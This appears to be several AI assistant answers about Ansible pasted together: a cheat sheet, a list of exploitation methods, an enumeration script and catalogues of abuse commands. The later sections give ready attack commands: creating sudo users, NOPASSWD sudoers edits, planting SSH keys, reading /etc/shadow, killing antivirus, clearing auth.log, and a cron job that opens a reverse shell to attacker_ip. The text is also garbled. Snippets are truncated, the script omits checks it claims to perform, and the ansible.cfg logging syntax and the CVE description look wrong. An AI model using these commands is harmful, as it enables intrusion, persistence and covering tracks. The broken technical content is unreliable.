Here's a concise Ansible cheat sheet covering essential commands and common use cases:

### **Ansible Configuration**

- **Inventory file:** Specifies hosts and groups.
```ini
[webservers]
server1 ansible_host=192.168.1.10
server2 ansible_host=192.168.1.11
```
- **ansible.cfg:** Configuration file that can define inventory paths, roles path, etc.
```ini
[defaults]
inventory = ./inventory
```
### **Common Commands**
- **Ping all hosts:**
  ```bash
  ansible all -m ping
  ```
- **Run a command on specific hosts:**
  ```bash
  ansible webservers -m shell -a "uptime"
  ```
- **Check Ansible configuration:**
  ```bash
  ansible-config dump --only-changed
  ```
- **List all hosts in inventory:**
  ```bash
  ansible-inventory --list -y
  ```

### **Playbooks**
- **Basic Playbook Structure:**
  ```yaml
  ---
  - name: Example playbook
    hosts: webservers
    tasks:
      - name: Ensure Apache is installed
        apt:
          name: apache2
          state: present
  ```
- **Running a playbook:**
  ```bash
  ansible-playbook site.yml
  ```

### **Modules**
- **File Module:**
  ```yaml

      name: "{{ item }}"
      state: present
    loop:
      - nginx
      - git
      - curl
  ```

### **Conditionals**
- **When Condition:**
  ```yaml
  - name: Install Apache on Debian
    apt:
      name: apache2
      state: present
    when: ansible_os_family == "Debian"
  ```

### **Handlers**
- **Defining and Using Handlers:**
  ```yaml
  - name: Ensure Apache is installed
    apt:

  ```
- **Limit execution to specific hosts:**
  ```bash
  ansible-playbook site.yml --limit server1
  ```

This cheat sheet should cover most basic to intermediate tasks you might encounter with Ansible.

Exploiting Ansible can involve leveraging misconfigurations, vulnerabilities, or insecure practices in Ansible playbooks, roles, or environments. Hereâ€™s a breakdown of methods that could be used to exploit Ansible:

### 1. **Exploiting Sensitive Data Exposure**
   - **Unencrypted Vault Files:** 
     - If sensitive data (like passwords or keys) is stored in plain text within playbooks or inventory files, it could be easily exploited by an attacker with access to the files.
   - **Weak Vault Passwords:**
     - If the Ansible Vault password is weak or stored insecurely (e.g., in environment variables or files with improper permissions), attackers can decrypt sensitive data.
   - **Public Repositories:**
     - Exposing playbooks containing sensitive information on public repositories (e.g., GitHub) can lead to data leaks.

   **Mitigation:**
   - Always use `ansible-vault` to encrypt sensitive data.
   - Use strong, unique passwords for vaults.
   - Never store vault passwords in repositories or insecure locations.

### 2. **Abusing Ansible Modules**
   - **Shell or Command Module Misuse:**
     - If a playbook uses the `shell` or `command` module with user-supplied input, it can lead to command injection.
     - Example:
       ```yaml
       - name: Run arbitrary command
         shell: "{{ user_input }}"
       ```
     - If `user_input` is not sanitized, an attacker could inject malicious commands.

   **Mitigation:**
   - Avoid using `shell` or `command` modules unless absolutely necessary.
   - Validate and sanitize any variables used in these modules.

### 3. **Privilege Escalation**
   - **Improper Sudo Usage:**
     - If a playbook allows sudo access without proper control or logging, an attacker could escalate their privileges on the target systems.
     - Example:
       ```yaml
       - name: Run with sudo
         command: "rm -rf /"
         become: yes
       ```
     - If `become: yes` is used without restrictions, it could be abused for privilege escalation.

   **Mitigation:**
   - Limit the use of `become: yes` to only necessary tasks.
   - Implement strict sudoers policies and logging for auditing.

### 4. **Backdoor Playbooks or Roles**
   - **Malicious Playbooks/Roles:**
     - An attacker could introduce backdoors into playbooks or roles, which could then be executed across multiple systems.
     - Example:
       ```yaml
       - name: Add SSH key for backdoor access
         authorized_key:
           user: root
           key: "attacker's SSH public key"
       ```

   **Mitigation:**
   - Review and audit playbooks and roles regularly.
   - Use role-based access control (RBAC) to limit who can edit and run playbooks.

### 5. **Abusing Ansible Facts**
   - **Compromising Host Facts:**
     - An attacker could manipulate or fake Ansible facts to alter playbook behavior, leading to unintended or malicious actions.
     - Example:
       ```yaml
       - name: Exploit fact injection
         command: "rm -rf /"
         when: ansible_os_family == 'FakeOS'
       ```

   **Mitigation:**
   - Be cautious when using facts in conditional statements.
   - Validate and sanitize facts where possible.

### 6. **Misconfigured Inventory Files**
   - **Exposed Inventory Files:**
     - If inventory files containing sensitive host information are exposed or misconfigured (e.g., world-readable), an attacker could target specific hosts for further exploitation.

   **Mitigation:**
   - Secure inventory files with appropriate permissions.
   - Store inventory files in a secure, centralized location.

### 7. **Insecure File Permissions**
   - **Insecure Permissions on Playbooks/Vars Files:**
     - If playbooks or variable files are stored with insecure permissions, unauthorized users could modify them to introduce malicious code.
   
   **Mitigation:**
   - Set restrictive file permissions on all Ansible-related files.
   - Regularly audit file permissions.

### 8. **User Account Abuse**
   - **Exploitation of Hardcoded Credentials:**
     - If user accounts or credentials are hardcoded in playbooks, these can be exploited by attackers for lateral movement or privilege escalation.
   - **Example:**
     ```yaml
     vars:
       admin_user: "admin"
       admin_pass: "password123"
     ```

   **Mitigation:**
   - Avoid hardcoding credentials; use vaults or other secure methods.
   - Rotate credentials regularly and enforce strong password policies.

### 9. **CVE Exploits**
   - **Exploiting Ansible CVEs:**
     - Known vulnerabilities in Ansible itself or related components (e.g., ansible-base, collections) could be exploited if not patched.
   - **Example:** CVE-2020-14330, which affected Ansible's use of `module_utils`.

   **Mitigation:**
   - Keep Ansible and related dependencies up to date.
   - Regularly monitor for security advisories and apply patches promptly.

### 10. **Network Manipulation**
   - **DNS Spoofing/ARP Poisoning:**
     - Attackers could manipulate network traffic to redirect Ansible tasks to malicious hosts, potentially compromising the entire automation process.

   **Mitigation:**
   - Use secure protocols (e.g., SSH with strong key authentication).
   - Implement network security measures like TLS and proper segmentation.

### 11. **Leveraging Poor Error Handling**
   - **Misleading Output:**
     - Improper handling of errors could allow attackers to obscure their activities or prevent detection.
   
   **Mitigation:**
   - Ensure playbooks include proper error handling and logging.
   - Review logs regularly for unusual activity.

These methods illustrate the potential risks associated with misconfigured or insecure Ansible environments. Following best practices, regularly auditing your setup, and staying updated on security advisories are key to mitigating these risks.

Certainly! Below is a shell script that performs basic enumeration of potential Ansible misconfigurations or exploitable settings on a Linux server. This script checks for common issues like exposed inventory files, world-readable playbooks, Ansible Vault files without encryption, and improper sudo usage.

```bash
#!/bin/bash

echo "Starting Ansible Security Enumeration..."

# Check for world-readable inventory files
echo "Checking for world-readable inventory files..."
find / -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.cfg" 2>/dev/null | while read -r file; do
    if [ -r "$file" ]; then
        perms=$(stat -c "%A" "$file")
        if [[ "$perms" =~ ^-rw-r--r-- ]]; then
            echo "World-readable file: $file"
        fi
    fi
done

# Check for exposed vault files
echo "Checking for Ansible Vault files..."
find / -name "*.vault" -o -name "*.vault.yml" 2>/dev/null | while read -r file; do
    echo "Possible Ansible Vault file found: $file"
done

# Check for hardcoded passwords in playbooks
echo "Checking for hardcoded passwords in Ansible playbooks..."
grep -rnw '/' -e "password" --include \*.yml --include \*.yaml 2>/dev/null

# Check for sudo privilege escalation in playbooks
echo "Checking for 'become: yes' usage in Ansible playbooks..."

# Check for files with insecure permissions
echo "Checking for playbooks and vars files with insecure permissions..."
find / -type f \( -name "*.yml" -o -name "*.yaml" \) -perm /o=r 2>/dev/null | while read -r file; do
    echo "File with insecure permissions: $file"
done

# Check for world-readable ansible.cfg files
echo "Checking for world-readable ansible.cfg files..."
find / -name "ansible.cfg" 2>/dev/null | while read -r file; do
    perms=$(stat -c "%A" "$file")
    if [[ "$perms" =~ ^-rw-r--r-- ]]; then
        echo "World-readable ansible.cfg file: $file"
    fi
done

# List users with sudo privileges
echo "Listing users with sudo privileges..."
getent group sudo | cut -d: -f4

# Check for unencrypted Ansible Vault files (heuristic)
echo "Checking for unencrypted Ansible Vault files..."
grep -rnw '/' -e "ANSIBLE_VAULT" --include \*.yml --include \*.yaml 2>/dev/null | while read -r line; do
    file=$(echo "$line" | cut -d: -f1)
    if ! grep -q 'ANSIBLE_VAULT;' "$file"; then
        echo "Unencrypted Ansible Vault file: $file"
    fi
done

echo "Ansible Security Enumeration Completed."

```

### What the Script Does:
1. **World-Readable Files**: Identifies world-readable `.ini`, `.yml`, `.yaml`, `.cfg` files that might expose sensitive data or configuration.
2. **Vault Files**: Searches for files with extensions commonly associated with Ansible Vaults.
3. **Hardcoded Passwords**: Scans for occurrences of the term "password" in YAML files, which may indicate hardcoded credentials.
4. **Privilege Escalation**: Checks for usage of `become: yes` in playbooks, which can indicate possible privilege escalation points.
5. **Shell/Command Modules**: Identifies playbooks using the `shell:` or `command:` modules, which could be exploited for command injection.
6. **Insecure Permissions**: Finds YAML files that are world-readable, indicating possible security risks.
7. **World-Readable `ansible.cfg`**: Locates `ansible.cfg` files that are world-readable, which might expose configuration details.
8. **Sudo Users**: Lists users who have sudo privileges on the system.
9. **Unencrypted Vault Files**: Looks for potential unencrypted Ansible Vault files using a heuristic approach.

### Usage:
1. Save the script to a file, for example `ansible_enum.sh`.
2. Make the script executable:
   ```bash
   chmod +x ansible_enum.sh
   ```
3. Run the script as root or with appropriate permissions:
   ```bash
   sudo ./ansible_enum.sh
   ```

### Important Notes:
- This script is a basic enumeration tool and may generate false positives.
- It's designed to run on Linux systems and may require root privileges to access certain files.
- Consider running this in a controlled environment, as scanning large filesystems can take time.

This script should help identify potential vulnerabilities or misconfigurations related to Ansible on a Linux server.

Ansible commands that involve privilege escalation or lateral movement can be powerful when misused or if improperly secured. Below are some Ansible commands and scenarios that could potentially lead to privilege escalation or lateral movement in a network:

### 1. **Privilege Escalation with `--become`**
   - The `--become` flag allows you to escalate privileges to another user, typically root, which can lead to privilege escalation if a playbook is misconfigured or if the target machine is compromised.
   - Example:
     ```bash
     ansible-playbook playbook.yml --become --become-user=root
     ```
   - In a playbook:
     ```yaml
     - name: Privilege escalation example
       hosts: all
       become: yes
       become_user: root
       tasks:
         - name: Install package with escalated privileges
           apt:
             name: htop
             state: present
     ```

### 2. **Running Arbitrary Commands with `command` or `shell` Modules**
   - These modules allow running arbitrary commands on remote systems, which can be leveraged for lateral movement if an attacker can control the playbook.
   - Example:
     ```yaml
     - name: Run arbitrary command with elevated privileges
       command: whoami
       become: yes
       become_user: root
     ```
   - This command would run as the root user, which could be dangerous if the command were something like creating a new privileged user or copying sensitive files.

### 3. **Copying SSH Keys for Lateral Movement**
   - An attacker can use Ansible to copy SSH keys to other systems, enabling lateral movement by establishing persistent, unauthorized access.
   - Example:
     ```yaml
     - name: Copy SSH key to target hosts
       hosts: all
       become: yes
       tasks:
         - name: Ensure ~/.ssh directory exists
           file:
             path: /root/.ssh
             state: directory
             mode: '0700'

         - name: Copy authorized_keys file
           copy:
             src: /path/to/attacker_key.pub
             dest: /root/.ssh/authorized_keys
             mode: '0600'
     ```

### 4. **Executing Scripts with Elevated Privileges**
   - The `script` module can be used to upload and execute a script on remote systems. If the script is run with `--become`, it could lead to privilege escalation.
   - Example:
     ```yaml
     - name: Upload and execute script with root privileges
       hosts: all
       become: yes
       become_user: root
       tasks:
         - name: Upload script
           copy:
             src: /local/path/to/script.sh
             dest: /tmp/script.sh
             mode: '0755'
         
         - name: Execute script
           command: /tmp/script.sh
     ```

### 5. **Modifying System Configuration Files**
   - Ansible can be used to modify sensitive system configuration files like `/etc/sudoers`, which can grant unauthorized access to users or groups.
   - Example:
     ```yaml
     - name: Add user to sudoers file
       hosts: all
       become: yes
       tasks:
         - name: Ensure sudoers file allows passwordless sudo for specific user
           lineinfile:
             path: /etc/sudoers
             state: present
             regexp: '^%admin'
             line: '%admin ALL=(ALL) NOPASSWD: ALL'
     ```

### 6. **Creating Users with Elevated Privileges**
   - You can use Ansible to create new users and add them to privileged groups, potentially escalating privileges.
   - Example:
     ```yaml
     - name: Create a new user with root privileges
       hosts: all
       become: yes
       tasks:
         - name: Create a new user
           user:
             name: attacker
             password: "{{ 'password' | password_hash('sha512') }}"
             shell: /bin/bash
             groups: sudo
             append: yes
     ```

### 7. **Pivoting Through SSH Proxy**
   - By using an SSH proxy with Ansible, an attacker can pivot to other network segments or hosts, moving laterally across the network.
   - Example:
     ```yaml
     - name: Connect through SSH proxy and execute command
       hosts: all
       become: yes
       tasks:
         - name: Configure SSH proxy
           set_fact:
             ansible_ssh_common_args: '-o ProxyCommand="ssh -W %h:%p user@proxyhost"'

         - name: Run command on target via proxy
           command: hostname
     ```

### **Key Points to Secure Against These Risks**:
- **Restrict `--become` Usage**: Limit the use of `--become` and control which users and hosts are allowed to escalate privileges.
- **Secure Playbooks**: Ensure that playbooks are stored securely and only trusted users have access.
- **Audit and Logging**: Regularly audit the execution of Ansible playbooks and maintain detailed logs to detect unauthorized usage.
- **Use SSH Key Management**: Properly manage and secure SSH keys to prevent unauthorized lateral movement.

Ansible ad-hoc commands can be powerful tools for quick, one-off tasks, but they can also be abused if an attacker gains control over them. Below are examples of ad-hoc commands that could be exploited for privilege escalation, lateral movement, or other malicious activities:

### 1. **Privilege Escalation with `--become`**
   - An attacker could use ad-hoc commands with the `--become` flag to escalate privileges, especially if they have access to an account with sudo privileges.
   - Example:
     ```bash
     ansible all -m shell -a "whoami" --become --become-user=root
     ```
   - This command runs `whoami` as the root user on all hosts.

### 2. **Running Arbitrary Shell Commands**
   - The `shell` and `command` modules allow running arbitrary commands on remote systems, which can be used to execute malicious code or alter system configurations.
   - Example:
     ```bash
     ansible all -m shell -a "useradd attacker -G sudo"
     ```
   - This command adds a new user named `attacker` to the `sudo` group, granting it administrative privileges.

### 3. **Modifying Critical System Files**
   - Ad-hoc commands can be used to modify critical system files, like `/etc/passwd` or `/etc/sudoers`, leading to privilege escalation.
   - Example:
     ```bash
     ansible all -m lineinfile -a "path=/etc/sudoers line='attacker ALL=(ALL) NOPASSWD: ALL'" --become
     ```
   - This command adds a line to the `sudoers` file, allowing the `attacker` user to execute any command without a password.

### 4. **Copying SSH Keys for Unauthorized Access**
   - Ad-hoc commands can be used to copy SSH keys to remote systems, enabling unauthorized access and lateral movement.
   - Example:
     ```bash
     ansible all -m copy -a "src=/home/attacker/.ssh/id_rsa.pub dest=/root/.ssh/authorized_keys" --become
     ```
   - This command copies the attacker's SSH public key to the root user's `authorized_keys` file on all hosts.

### 5. **Installing Malicious Software**
   - An attacker could use ad-hoc commands to install malicious software or tools that could be used for further attacks or persistence.
   - Example:
     ```bash
     ansible all -m apt -a "name=netcat state=present" --become
     ```
   - This command installs `netcat`, which can be used for various malicious purposes like setting up reverse shells.

### 6. **Exfiltrating Sensitive Data**
   - An ad-hoc command can be used to gather and exfiltrate sensitive data from remote systems.
   - Example:
     ```bash
     ansible all -m shell -a "cat /etc/shadow" --become
     ```
   - This command reads the contents of the `/etc/shadow` file, which contains password hashes, and could be exfiltrated by redirecting the output to a remote server.

### 7. **Killing Security Processes**
   - Ad-hoc commands can be used to kill security-related processes (e.g., antivirus, monitoring agents), weakening the systemâ€™s defenses.
   - Example:
     ```bash
     ansible all -m shell -a "pkill -f antivirus_process" --become
     ```
   - This command kills a process related to an antivirus program, potentially allowing further attacks to go undetected.

### 8. **Pivoting with SSH Proxy**
   - Ad-hoc commands can be used to pivot through an SSH proxy, enabling lateral movement within a network.
   - Example:
     ```bash
     ansible all -m command -a "hostname" -e "ansible_ssh_common_args='-o ProxyCommand=\"ssh -W %h:%p user@proxyhost\"'"
     ```
   - This command runs the `hostname` command on all hosts via an SSH proxy, allowing the attacker to move laterally across the network.

### 9. **Establishing Persistence**
   - An attacker could use ad-hoc commands to establish persistence on a compromised system, such as by creating cron jobs or adding backdoors.
   - Example:
     ```bash
     ansible all -m cron -a "name='Backdoor' job='/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1' minute='*/5'" --become
     ```
   - This command creates a cron job that opens a reverse shell every 5 minutes.

### 10. **Clearing Logs to Cover Tracks**
   - An ad-hoc command can be used to clear logs on remote systems, making it harder for defenders to trace the attack.
   - Example:
     ```bash
     ansible all -m shell -a "cat /dev/null > /var/log/auth.log" --become
     ```
   - This command clears the contents of the `auth.log` file, which contains authentication-related logs.

### **Key Mitigations**:
- **Restrict Ad-Hoc Command Usage**: Limit who can run ad-hoc commands, and restrict their use to specific, trusted users.
- **Use Least Privilege**: Ensure that playbooks and ad-hoc commands only use the privileges necessary for the task at hand.
- **Audit and Monitor**: Continuously monitor the execution of ad-hoc commands and audit logs to detect and respond to unauthorized usage.
- **Secure SSH Keys**: Properly manage and secure SSH keys to prevent unauthorized access and lateral movement.

By being aware of how ad-hoc commands can be misused, you can better secure your Ansible environment against potential attacks.

Yes, you can find information about Ansible from syslog, particularly if the logging has been set up to capture Ansible-related activities. Hereâ€™s how you can use syslog to gather information about Ansible:

### **1. Ansible Logging to Syslog**
Ansible can be configured to send its logs to syslog. This is done by setting up a custom logging configuration in Ansibleâ€™s `ansible.cfg` file. If logging is configured this way, syslog will contain detailed logs about Ansible tasks, which can be useful for auditing and troubleshooting.

#### Example `ansible.cfg` logging configuration:
```ini
[defaults]
log_path = /var/log/ansible.log

[loggers]
keys=root,logstash

[handlers]
keys=console,syslog

[formatters]
keys=full,syslog

[handler_console]
class=StreamHandler
formatter=full
args=(sys.stdout,)

[handler_syslog]
class=handlers.SysLogHandler
formatter=syslog
args=(('/dev/log'), handlers.SysLogHandler.LOG_LOCAL0)

[formatter_full]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s

[formatter_syslog]
format=%(message)s
```

### **2. Checking Syslog for Ansible Events**
If Ansible logs to syslog, you can use tools like `grep` to search for specific keywords related to Ansible.

#### Example commands:
```bash
# Search for "ansible" related logs in syslog
grep 'ansible' /var/log/syslog

# Search for specific tasks or plays
grep 'TASK' /var/log/syslog

# Search for specific hosts or IP addresses
grep 'hostname_or_ip' /var/log/syslog

# View logs in real-time
tail -f /var/log/syslog | grep 'ansible'

### **3. Analyzing Ansible Logs**
- **Playbook Runs**: You can find logs related to the execution of Ansible playbooks, including details about which tasks were run, on which hosts, and with what results.
- **Modules Executed**: If youâ€™re looking for evidence of specific modules being run, like `command`, `shell`, or `copy`, you can search for these keywords in the logs.
- **Privilege Escalation Attempts**: If `--become` is used, it might be logged as part of the task execution, and you can search for evidence of privilege escalation.

### **4. Syslog Monitoring Tools**
You can use monitoring tools that aggregate and analyze syslog data to automatically detect suspicious activities related to Ansible, such as:
- **SIEM Systems**: Security Information and Event Management (SIEM) systems can be configured to alert on specific Ansible-related log entries that indicate potential security issues.
- **Log Analysis Tools**: Tools like `ELK Stack` (Elasticsearch, Logstash, Kibana) or `Splunk` can be used to visualize and analyze Ansible logs in syslog for patterns or anomalies.

### **5. Potential Log Entries to Look For**
- **Playbook and task starts/stops**: These might be logged when a playbook or task begins or ends.
- **Error messages**: If something goes wrong, errors will likely be logged, which can help in diagnosing issues.
- **Privilege escalation messages**: Look for entries that indicate the use of `--become` or similar privilege escalation attempts.
- **Host connectivity issues**: Logs might show if Ansible fails to connect to a host, which could indicate network issues or incorrect inventory settings.

### **6. Example Logs in Syslog**
Hereâ€™s what some Ansible-related syslog entries might look like:
```plaintext
Aug 23 14:12:34 myhost ansible-command: TASK [Gathering Facts] *******************************************************************
Aug 23 14:12:35 myhost ansible-command: ok: [webserver1]
Aug 23 14:12:35 myhost ansible-command: TASK [Install Apache] ********************************************************************
Aug 23 14:12:36 myhost ansible-command: changed: [webserver1]
```

### **Summary**
- **Yes**, you can find information about Ansible in syslog, especially if Ansible has been configured to log to syslog.
- **Look for**: Playbook executions, task runs, module invocations, privilege escalations, and errors.
- **Use Tools**: Grep, tail, and log monitoring tools to search for and analyze Ansible-related log entries.
